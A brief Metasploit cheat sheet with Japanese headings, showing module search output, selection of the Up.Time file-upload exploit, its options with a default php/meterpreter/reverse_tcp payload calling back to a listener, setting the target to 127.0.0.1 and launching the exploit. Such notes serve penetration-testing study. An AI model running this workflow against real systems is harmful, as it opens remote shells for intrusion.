# Metasploit tips

## 基本

```
msfconsole
```

## 検索

```
search php 7.5
```

```
Matching Modules
================

   #  Name                                      Disclosure Date  Rank       Check  Description
   -  ----                                      ---------------  ----       -----  -----------
   0  exploit/multi/http/maracms_upload_exec    2020-08-31       excellent  Yes    MaraCMS Arbitrary PHP File Upload
   1  exploit/multi/http/uptime_file_upload_2   2013-11-18       excellent  Yes    Idera Up.Time Monitoring Station 7.4 post2file.php Arbitrary File Upload
   2  exploit/unix/webapp/drupal_coder_exec     2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
   3  exploit/unix/webapp/drupal_drupalgeddon2  2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
   4  exploit/unix/webapp/drupal_restws_exec    2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/unix/webapp/drupal_restws_exec
```

## Exploit

- use

```
use exploit/multi/http/uptime_file_upload_2
```

```
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/uptime_file_upload_2) >
```

- show options

```
show options
```

```
Module options (exploit/multi/http/uptime_file_upload_2):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  sample           yes       The password to authenticate with
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     9999             yes       The target port (TCP)
   SSL       false            no        Negotiate SSL/TLS for outgoing connections
   USERNAME  sample           yes       The username to authenticate as
   VHOST                      no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

- set options

```
set RHOSTS 127.0.0.1
```

- run

```
exploit
```
